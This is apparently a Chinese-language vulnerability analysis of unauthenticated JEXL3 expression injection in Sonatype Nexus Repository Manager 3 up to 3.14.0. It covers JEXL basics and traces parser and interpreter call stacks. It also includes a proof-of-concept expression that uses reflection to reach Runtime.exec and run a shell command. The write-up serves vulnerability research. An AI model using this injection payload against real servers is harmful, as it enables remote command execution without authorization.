# 简介
Sonatype Nexus Repository Manager 3的`plugins/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/ComponentComponent.groovy`接口未进行权限验证，该接口可以在未授权访问时发送精心构造的恶意`JSON`数据，造成`JEXL3`表达式注入进而远程执行任意命令。
影响版本：Nexus Repository Manager OSS/Pro 3.x - 3.14.0
修复版本：Nexus Repository Manager OSS/Pro 3.15.0
# JEXL表达式
JEXL（Java EXpression
Language），这是一种简单的表达语言，JEXL基于对JSTL表达式语言进行一些扩展从而实现一种表达式语言，最初受Apache
Velocity和JavaServer Pages标准标记库版本1.1（JSTL）和JavaServer Pages
2.0（JSP）中定义的表达语言的启发。
## 示例
选择Nexus-Repository-Manager3中使用的JEXL3，添加`pom.xml`依赖：
        org.apache.commons
        commons-jexl3
        3.0
使用的基本步骤：
  * 创建表达式引擎对象
  * 创建想要执行的表达式语句，语句中可以包含变量
  * 创建表达式Context对象，给表达式中的变量赋值
  * 使用表达式引擎创建表达式对象
  * 使用表达式对象执行表达式计算
伪代码：
    // Create a JexlEngine (could reuse one instead)
    JexlEngine jexl = new JexlBuilder().create();
    // Create an expression object equivalent to 'car.getEngine().checkStatus()':
    String jexlExp = "car.engine.checkStatus()";
    Expression e = jexl.createExpression( jexlExp );
    // The car we have to handle coming as an argument...
    Car car = theCarThatWeHandle;
    // Create a context and add data
    JexlContext jc = new MapContext();
    jc.set("car", car );
    // Now evaluate the expression, getting the result
    Object o = e.evaluate(jc);
实际代码：
Foo.java
    public static class Foo {
        public String getFoo() {
            return "This is from getFoo()";
        }
        public String get(String arg) {
            return "This is the property " + arg;
        }
        public String convert(long i) {
            return "The value is : " + i;
        }
    }
Foo类包含三个简单方法，包含有参数和无参数方法。
TestCase.java
    package Nexus;
    import org.apache.commons.jexl3.*;
    public class TestCase {
        public static void main(String[] args) {
            JexlEngine jexl = new JexlBuilder().create();
            JexlContext jc = new MapContext();
            Foo foo = new Foo();
            Integer number = new Integer(9999);
            jc.set("foo", foo);
            jc.set("number", number);
            JexlExpression e = jexl.createExpression("foo.getFoo()");
            Object o = e.evaluate(jc);
            System.out.println("value returned by the method getFoo() is : " + o + " | " + foo.getFoo());
            e = jexl.createExpression("foo.convert(1)");
            o = e.evaluate(jc);
            System.out.println("value of " + e.getParsedText() + " is : " + o + " | " + foo.convert(1));
            e = jexl.createExpression("foo.convert(number)");
            o = e.evaluate(jc);
            System.out.println("value of " + e.getParsedText() + " is : " + o + " | " + foo.convert(9999));
            e = jexl.createExpression("foo.bar");
            o = e.evaluate(jc);
            System.out.println("value returned for the property 'bar' is : " + o + " | " + foo.get("bar"));
        }
        public static class Foo {
            public String getFoo() {
                return "This is from getFoo()";
            }
            public String get(String arg) {
                return "This is the property " + arg;
            }
            public String convert(long i) {
                return "The value is : " + i;
            }
        }
    }
首先是`new JexlBuilder().create()`创建引擎对象，接着`new
MapContext()`创建表达式Context对象数组，接着创建`Integer`对象和`Foo`对象通过`set`放入数组中。
  * 第一个例子`createExpression("foo.getFoo()")`，创建引擎创建表达式对象，然后通过`evaluate`执行计算。表达式字符串存在`foo`，因此会到表达式Context数组中匹配到`Foo`对象，并执行无参数的`getFoo()`方法。
  * 第二个例子`createExpression("foo.convert(1)")`，指定传入参数`1`并调用`convert()`，结果为`1`
  * 第三个例子`createExpression("foo.convert(number)")`，到Context数组中寻找传入参数的`number`，并调用`convert()`，结果为`9999`
运行结果：
    value returned by the method getFoo() is : This is from getFoo() | This is from getFoo()
    value of foo.convert(1) is : The value is : 1 | The value is : 1
    value of foo.convert(number) is : The value is : 9999 | The value is : 9999
    value returned for the property 'bar' is : This is the property bar | This is the property bar
## RCE
精心构造恶意的表达式，表达式对象执行时能够完成任意命令执行，POC如下：
    package Nexus;
    import org.apache.commons.jexl3.*;
    public class JEXLTEST {
        public static void main(String[] args) {
            String Exp = "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/rai4over')";
            JexlEngine engine = new JexlBuilder().create();
            JexlExpression Expression = engine.createExpression(Exp);
            JexlContext Context = new MapContext();
            //Context.set("foo", 999);
            Object rs = Expression.evaluate(Context);
            System.out.println(rs);
        }
    }
org.apache.commons.jexl3.JexlBuilder#create
`new JexlBuilder().create()`首先创建`JexlBuilder`类对象，然后调用`create`方法创建并返回`Engine`对象
org.apache.commons.jexl3.internal.Engine#Engine(org.apache.commons.jexl3.JexlBuilder)
`Engine`对象使用构造函数进行初始化，并且`Engine`类继承`JexlEngine`类，返回上层执行`engine.createExpression(Exp)`。
org.apache.commons.jexl3.JexlExpression
`expression`必须是有效的JEXL表达式字符串，调用父类`JexlEngine`的`createExpression`方法。
org.apache.commons.jexl3.internal.Engine#createExpression
使用`trimSource`去掉表达式的空白，然后传入`parse`函数
org.apache.commons.jexl3.internal.Engine#parse
然后调用`this.parser.parse()`进行解析表达式，`this.parser`对象构造函数
org/apache/commons/jexl3/internal/Engine.java:91
org.apache.commons.jexl3.parser.Parser#Parser(java.io.Reader)
继续跟进`parse`对象的`parse()`
org.apache.commons.jexl3.parser.Parser#parse
org.apache.commons.jexl3.parser.JJTParserState#closeNodeScope(org.apache.commons.jexl3.parser.Node,
boolean)
解析表达式的过程很长，通过节点`node`进行解析，解析的调用栈为：
    closeNodeScope:112, JJTParserState (org.apache.commons.jexl3.parser)
    Arguments:3044, Parser (org.apache.commons.jexl3.parser)
    MethodCall:3565, Parser (org.apache.commons.jexl3.parser)
    MemberExpression:3604, Parser (org.apache.commons.jexl3.parser)
    ValueExpression:3634, Parser (org.apache.commons.jexl3.parser)
    UnaryExpression:2367, Parser (org.apache.commons.jexl3.parser)
    MultiplicativeExpression:2080, Parser (org.apache.commons.jexl3.parser)
    AdditiveExpression:2000, Parser (org.apache.commons.jexl3.parser)
    RelationalExpression:1661, Parser (org.apache.commons.jexl3.parser)
    EqualityExpression:1549, Parser (org.apache.commons.jexl3.parser)
    AndExpression:1505, Parser (org.apache.commons.jexl3.parser)
    ExclusiveOrExpression:1461, Parser (org.apache.commons.jexl3.parser)
    InclusiveOrExpression:1417, Parser (org.apache.commons.jexl3.parser)
    ConditionalAndExpression:1373, Parser (org.apache.commons.jexl3.parser)
    ConditionalOrExpression:1329, Parser (org.apache.commons.jexl3.parser)
    ConditionalExpression:1247, Parser (org.apache.commons.jexl3.parser)
    AssignmentExpression:947, Parser (org.apache.commons.jexl3.parser)
    Expression:943, Parser (org.apache.commons.jexl3.parser)
    JexlExpression:155, Parser (org.apache.commons.jexl3.parser)
    parse:27, Parser (org.apache.commons.jexl3.parser)
    parse:684, Engine (org.apache.commons.jexl3.internal)
    createExpression:371, Engine (org.apache.commons.jexl3.internal)
    createExpression:59, Engine (org.apache.commons.jexl3.internal)
    createExpression:289, JexlEngine (org.apache.commons.jexl3)
    main:13, JEXLTEST (Nexus)
层层返回到`createExpression`函数
org/apache/commons/jexl3/internal/Engine.java:371
`ASTJexlScript`对象通过`children`成员层级关系存储解析出来的`node`节点，并传入`Script`构造函数。
org.apache.commons.jexl3.internal.Script#Script
分别放入`Script`类的各个成员中，最终返回`Script`类对象到`main`函数。
Expression类型为`Script`，且继续传入表达式Context对象调用`evaluate`方法
org.apache.commons.jexl3.internal.Script#evaluate
传入包含全部层级关系的`node`进入`interpreter.interpret`进行解析
org.apache.commons.jexl3.internal.Interpreter#interpret
后面就是层层解析`node`，最后通过反射完成命令执行，调用栈如下：
    exec:347, Runtime (java.lang)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invoke:93, MethodExecutor (org.apache.commons.jexl3.internal.introspection)
    call:1665, Interpreter (org.apache.commons.jexl3.internal)
    visit:1409, Interpreter (org.apache.commons.jexl3.internal)
    jjtAccept:18, ASTMethodNode (org.apache.commons.jexl3.parser)
    visit:1133, Interpreter (org.apache.commons.jexl3.internal)
    jjtAccept:18, ASTReference (org.apache.commons.jexl3.parser)
    interpret:201, Interpreter (org.apache.commons.jexl3.internal)